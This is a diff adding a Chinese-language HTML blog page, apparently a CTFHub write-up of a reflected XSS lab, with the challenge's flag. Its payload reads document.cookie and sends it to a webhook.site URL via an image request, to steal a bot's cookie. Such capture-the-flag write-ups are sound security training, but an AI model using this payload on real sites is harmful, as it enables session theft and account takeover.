@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-反射型XSS Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-反射型XSS Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.21 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, XSS, 反射型, Webhook</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - XSS / 反射型</li>
+        <li><strong>题目名称：</strong>反射型</li>
+        <li><strong>提示：</strong>页面提供一个注入点和一个“Send URL to Bot”功能。目标是通过触发XSS漏洞，窃取机器人（模拟管理员）的Cookie。</li>
+    </ul>
+
+    <h2>2. 解题思路</h2>
+    <p>反射型XSS的核心在于：服务器未对用户输入进行过滤，将恶意代码原封不动地“反射”回浏览器并执行。由于目标Flag存储在Bot的Cookie中，需采用 <strong>OOB（带外数据）</strong> 技术。借助在线工具 <code>Webhook.site</code> 搭建“收件箱”，构造恶意的URL链接，诱导Bot访问，将Cookie外带。</p >
+    <p><em>另：反射型XSS就像“传声筒”，你对着传声筒说了一句坏话，它原封不动地传给了后面的人执行。而Webhook就是一个“信箱”，用来接收Bot偷偷扔过来的信件。</em></p >
+
+    <h2>3. 操作步骤</h2>
+    
+    <p><strong>第一步：漏洞探测</strong></p >
+    <p>在 <code>What's your name</code> 输入框输入基础测试Payload：</p >
+    <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+    <p>点击Submit，页面成功弹窗。说明服务器未做任何过滤，反射型XSS漏洞存在。</p >
+
+    <p><strong>第二步：搭建“收件箱”</strong></p >
+    <p>访问 <code>https://webhook.site</code>，获取专属的唯一URL，例如：</p >
+    <pre><code>https://webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689</code></pre>
+
+    <p><strong>第三步：构造外带Payload</strong></p >
+    <p>在靶场的输入框中，注入以下代码（注意需将URL替换为你的专属地址），利用生成隐形图片的方式发起请求：</p >
+    <pre><code>&lt;script&gt;new Image().src='https://webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689/?cookie='+document.cookie;&lt;/script&gt;</code></pre>
+    <p>点击Submit后，复制浏览器地址栏生成的完整长URL（包含已编码的恶意参数）。</p >
+
+    <p><strong>第四步：诱导Bot触发</strong></p >
+    <p>将地址栏复制出的靶场长URL，粘贴到页面底部的 <code>Send URL to Bot</code> 输入框中，点击Send。页面提示 <code>Successfully</code>。</p >
+
+    <p><strong>第五步：捕获Flag</strong></p >
+    <p>返回Webhook.site页面，等待数秒，在左侧INBOX中查看收到的新请求。在 <code>Query strings</code> 中发现 <code>cookie</code> 参数，获取到Flag：</p >
+    <pre><code>ctfhub{1806f8647948d77a2532d24b}</code></pre>
+    <p>提交至CTFHub，通关成功。</p >
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：URL锚点导致参数丢失。</strong>复制Webhook地址时，直接复制了带 <code>#!/view/</code> 的浏览器页面地址。<code>#</code> 在HTTP请求中只作前端锚点，浏览器不会发送 <code>#</code> 后面的内容，会导致参数被截断。需手动去掉 <code>#!/view/</code>，只保留纯净的专属ID。</li>
+        <li><strong>坑2：机器人不接收代码。</strong>尝试将Payload直接粘贴进 <code>Send URL to Bot</code> 中触发系统报错 <code>Not Match...</code>。Bot接收的是合法的 <code>http(s)</code> 网址，而不是代码本身。我们需要把Payload注入输入框，然后复制整个靶场页面生成的网址发送给Bot。</li>
+        <li><strong>坑3：视角错位，误以为失败。</strong>在发送给Bot前，一直手动刷新Webhook页面，看见 <code>No default content</code> 以为工具无效。Webhook是“接收端”，只有“发送端”（Bot）执行后，它才会显示数据。应盯紧Send后的页面状态。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>反射型XSS与OOB：</strong>反射型XSS需要受害者主动访问带有恶意参数的URL。当目标是无回显的盲打场景时，需要利用外部服务器（如Webhook）接收带外数据（OOB）。</li>
+        <li><strong>外带Payload的代码结构拆解：</strong>
+            <br>我们成功外带的Payload为：<code>&lt;script&gt;new Image().src='https://webhook.site/.../?cookie='+document.cookie;&lt;/script&gt;</code>
+            <br>我们将其拆解为四个部分来理解：
+            <ol>
+                <li><strong>执行入口：</strong><code>&lt;script&gt;...&lt;/script&gt;</code>。告诉浏览器“这里面不是普通文字，是JavaScript代码，请直接运行”。</li>
+                <li><strong>隐蔽外发通道：</strong><code>new Image()</code>。在内存中创建一个隐形图片，用户看不到。设置它的 <code>.src</code> 属性时，浏览器为了加载这张图，会悄悄向指定的网址发起一个网络请求（GET请求）。</li>
+                <li><strong>拼接目标数据：</strong><code>+document.cookie</code>。这是JavaScript的内置功能，用来读取当前浏览器在该网站下的Cookie（里面包含了Flag）。加号 <code>+</code> 用于把前面的网址和这个Cookie数据拼接成完整的URL字符串。</li>
+                <li><strong>数据接收端：</strong><code>'https://webhook.site/.../?cookie='</code>。这是我们在Webhook搭建的“信箱”地址，成功接收到请求后，就可在其后台看到以 <code>?cookie=</code> 为参数名外带出来的数据。</li>
+            </ol>
+        </li>
+        <li><strong>XSS漏洞验证流程：</strong>输入测试字符 -> 观察回显位置 -> F12检查HTML源码 -> 测试弹窗Payload -> 确认过滤机制。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
